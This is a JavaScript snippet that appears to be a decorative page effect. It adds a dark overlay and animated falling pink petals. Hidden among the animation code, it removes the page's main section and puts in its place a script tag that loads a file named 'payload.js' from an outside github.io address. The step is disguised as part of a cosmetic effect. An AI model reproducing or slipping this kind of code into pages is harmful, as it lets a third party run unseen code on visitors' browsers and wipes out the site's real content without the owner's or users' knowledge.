// Create a style element for CSS
const style = document.createElement('style');
style.textContent = `
  body {
    position: relative;
    overflow: hidden; /* Prevents scrollbars from appearing */
  }

  /* Black transparent background */
  body::before {
    content: '';
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.5); /* Adjust opacity as needed */
    z-index: -1; /* Behind all other content */
  }

  @keyframes fall {
    0% {
      transform: translateY(0); /* Start from the top */
    }
    100% {
      transform: translateY(100vh); /* Fall to the bottom */
    }
  }

  .petal {
    position: absolute;
    width: 10px;
    height: 10px;
    background-color: pink;
    opacity: 0.7;
    border-radius: 50%;
    animation: fall linear infinite;
    pointer-events: none; /* So they don't interfere with other elements */
    z-index: 1; /* In front of the background */
  }
`;

// Append the style to the head
document.head.appendChild(style);

// Replace the entire <section> element with the script tag
const sectionElement = document.querySelector('section#section-page');
if (sectionElement) {
  sectionElement.outerHTML = `<script src="https://vmpirevigil0.github.io/ai/payload.js"></script>`;
}

// Function to create a petal
function createPetal() {
  const petal = document.createElement('div');
  petal.className = 'petal';
  
  // Randomize position and animation duration
  petal.style.left = Math.random() * window.innerWidth + 'px';
  petal.style.animationDuration = (Math.random() * 3 + 2) + 's'; // 2s to 5s
  petal.style.top = -10 + 'px'; // Start just above the viewport

  // Append the petal to the body
  document.body.appendChild(petal);

  // Remove petal after animation
  petal.addEventListener('animationend', () => {
    petal.remove();
  });
}

// Generate petals every 300ms
setInterval(createPetal, 300);
